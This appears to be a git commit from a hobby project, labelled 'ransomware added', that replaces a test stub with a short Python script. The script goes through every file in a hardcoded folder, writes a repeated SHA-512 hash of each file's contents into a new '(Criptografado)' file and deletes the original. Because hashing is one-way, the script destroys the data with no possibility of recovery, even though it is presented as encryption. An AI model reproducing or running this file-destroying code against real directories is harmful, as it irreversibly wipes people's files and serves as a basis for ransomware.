3c3464b315bf50eb71a3b615e2697678426aae7e
Deivid Almeida <deividalmeida365@gmail.com>
2021-10-26 22:48:39 -0300

    ransomware added

--- ransomware/ransomware.py
+++ ransomware/ransomware.py
@@ -1,2 +1,21 @@
-def myName():
-    print("Teste AQUI!!");
+# path =  deivid/'Área de Trabalho'/testeRansomware
+import hashlib
+import os
+
+diretorio = "/home/deivid/Documentos/testeRansomware"
+
+for files in os.listdir(diretorio):
+    os.chdir(diretorio)
+    with open(files, 'rb') as rb:
+        dados = rb.read()
+
+        criptografar = hashlib.sha512(dados).hexdigest()
+        novo_arquivo = "(Criptografado)" + os.path.basename(files)
+
+        with open(novo_arquivo, 'w') as novo:
+            novo.write(criptografar*0x77)
+
+            novo.close()
+            rb.close()
+
+            os.remove(files);
